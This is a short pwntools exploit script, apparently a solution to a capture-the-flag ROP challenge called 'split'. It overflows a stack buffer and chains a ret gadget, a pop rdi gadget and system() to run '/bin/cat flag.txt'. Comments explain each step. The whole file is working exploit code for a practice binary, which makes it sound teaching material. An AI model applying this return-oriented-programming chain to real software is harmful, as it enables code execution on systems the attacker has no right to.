from pwn import *

elf = ELF('./split')

offset = 40
pop_rdi = 0x4007c3
ret = 0x40053e
usefulString = elf.symbols['usefulString']
system = elf.symbols['system']

p = gdb.debug('./split')

# Offset for overwrite saved rip
payload = "A" * offset

# On some version of GLIBC, system uses movaps instruction,
# the stack must be 16-byte aligned, so we add a ret gadget
# for that
payload += p64(ret)

# usefulString contains "/bin/cat flag.txt", we put its address
# in rdi 
payload += p64(pop_rdi)
payload += p64(usefulString)

# We call system with usefulString as argument, we get the flag
payload += p64(system)

p.sendline(payload)

p.interactive()
